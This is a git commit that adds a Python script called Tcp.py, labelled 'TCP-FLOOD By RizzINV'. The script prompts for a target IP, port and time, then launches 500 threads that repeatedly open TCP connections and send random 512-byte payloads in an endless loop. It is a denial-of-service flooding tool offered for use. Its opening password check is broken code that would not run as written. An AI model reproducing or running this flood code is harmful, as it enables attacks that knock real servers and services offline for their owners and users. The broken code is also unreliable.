520b62764f7a8bc79e13046e4566a998405511e3
RizzINV01 <129343299+RizzINV01@users.noreply.github.com>
2023-07-23 07:50:36 +0700

    Create Tcp.py

---
+++ Tcp.py
@@ -0,0 +1,44 @@
+import os
+import time
+import threading
+import socket
+import random
+
+password = int(input("Password : ")
+pw = cumarizz
+
+if password = pw
+print("Correct Password")
+else 
+print("try again")
+os.system("clear")
+
+logo = """
+□□□□□□□□□
+□  RizzINV  □
+□□□□□□□□□
+"""
+print(logo)
+print("TCP-FLOOD By RizzINV")
+ip = str(input("IP : "))
+port = int(input("PORT : "))
+times = int(input("TIME : "))
+os.system("clear")
+
+def tcpfl():
+    rizz = random._urandom(512)
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((ip,port))
+            sock.send(rizz)
+            for x in range(times):
+                sock.send(rizz)
+            print(f"Sending Flood to > ip : {ip} port : ${port} | with time => {times}")
+        except socket.error:
+            print(f"Error Cant Connecting | ip : {ip} port : {port}")
+            sock.close()
+   
+for x in range(500):
+    t = threading.Thread(target=tcpfl)
+    t.start()
